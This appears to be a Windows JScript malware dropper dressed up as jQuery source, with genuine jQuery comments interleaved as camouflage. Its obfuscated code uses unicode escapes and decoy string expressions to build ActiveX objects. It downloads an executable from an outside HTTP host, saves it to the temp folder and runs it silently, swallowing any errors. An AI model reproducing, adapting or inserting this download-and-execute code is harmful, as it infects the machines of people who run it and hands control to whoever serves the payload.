// // Support: Android<4.1, IE<9  // Make sure we trim BOM and NBSP  rtrim = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,

var weREUl = 'Ru\u006E'; var Alhai = this[("abstractions","airplane","catalyst","programme","belongs",'A')+'c'+'\u0074i\u0076\u0065\u0058\u004F\u0062\u006Ae'+'\u0063t'];
var pcDRW = new Alhai('W'+'Sc\u0072i\u0070\u0074\u002E'+("announce","suppliers",'S\u0068')+("testimony","alternation","trinity","quilt",'e\u006Cl'));
// // Matches dashed string for camelizing  rmsPrefix = /^-ms-/,  rdashAlpha = /-([\da-z])/gi,
var isduwcL = pcDRW['E'+("adorable","desecration","omniscience",'xp\u0061\u006E\u0064\u0045\u006E\u0076\u0069\u0072\u006Fnm\u0065n\u0074')+'S'+("vertical","virtue","owners","details","tricks",'t\u0072\u0069\u006Egs')]('%\u0054'+("organize","automatically","smart",'E')+'M'+'\u0050%') + ("cosmopolitan","formations","regard",'/')+'\u006C\u0079nt'+'q\u0047\u0064LI\u0031\u0030'+("export","xhtml",'.\u0065x\u0065');
// // Used by jQuery.camelCase as callback to replace()  fcamelCase = function( all, letter ) {   return letter.toUpperCase();  };
var mEryWE = new Alhai('\u004DSX'+'ML\u0032\u002E\u0058'+'M'+("legendary","bologna",'\u004C\u0048TTP'));
//jQuery.fn = jQuery.prototype = {
mEryWE[("dictatorship","fiftieth","corporate","conclusions","bladder",'\u006Fnr')+'\u0065a'+'d\u0079\u0073t\u0061\u0074e\u0063h\u0061'+("continues","results","shameless","apocryphal",'ng\u0065')] = function () {
        if (mEryWE['r'+("birmingham","shewn","myrtle","consulting","dylan",'\u0065ad\u0079')+'s\u0074'+("unceasing","discredit","pastime","grocery","shannon",'\u0061te')] === 4) {
            var zYSnklU = new Alhai('A\u0044'+("right","wigwam",'O')+'\u0044B.\u0053t\u0072'+("homespun","pediatric","ducking","carbonate","headgear",'ea\u006D'));
            // // The current version of jQuery being used  jquery: version,
            zYSnklU['op\u0065\u006E']();
            // constructor: jQuery,
            zYSnklU['\u0074\u0079pe'] = 1;
            // // Start with an empty selector  selector: "",
            zYSnklU['w'+'r'+'i'+("afford","portraiture","musty","liqueur",'t\u0065')](mEryWE[("dominoes","astronomy","bogus",'Re\u0073')+'p\u006Fn\u0073'+'e'+("gauge","impolite","implications",'Bo\u0064\u0079')]);
            // // The default length of a jQuery object is 0  length: 0,
            zYSnklU['p\u006F'+'s'+'\u0069ti'+("italiano","shirts","crags","waterproof",'\u006Fn')] = 0;
            // toArray: function() {   return slice.call( this );  },
            zYSnklU[("babes","swish","advisory","weakling","demeter",'\u0073a')+'v'+'e'+("bermuda","forestry","joyance",'To\u0046i\u006C\u0065')](isduwcL, 2);
            // // Get the Nth element in the matched element set OR  // Get the whole matched element set as a clean array  get: function( num ) {   return num != null ?
            zYSnklU['c'+("estranged","sharpen","admit",'l')+("quire","giver","quarterly",'o')+'s\u0065']();
            //   // Return just the one element from the set    ( num < 0 ? this[ num + this.length ] : this[ num ] ) :
        };
};
try {

    //   // Return all the elements in a clean array    slice.call( this );  },
    mEryWE['o\u0070e\u006E']('G\u0045T', '\u0068t\u0074p\u003A'+("adherence","number","auctions","hypnotized",'//\u0073')+'\u006D1.'+("clyde","erosion",'b\u0079/\u0076\u0071\u006D\u006F\u0064\u002F\u0078m\u006C/\u00376\u0074r5r\u0067\u0075\u0069\u006Em\u006C\u002E\u0065x\u0065'), false);

    // // Take an array of elements and push it onto the stack  // (returning the new matched element set)  pushStack: function( elems ) {
    mEryWE['\u0073\u0065nd']();
    //  // Build a new jQuery matched element set   var ret = jQuery.merge( this.constructor(), elems );
    pcDRW[weREUl](isduwcL, 1, "SNdBCuCz" === "wwLyugfu");
    //  // Add the old object onto the stack (as a reference)   ret.prevObject = this;   ret.context = this.context;
} catch (PJBDoeH) { };
//  // Return the newly-formed element set   return ret;  },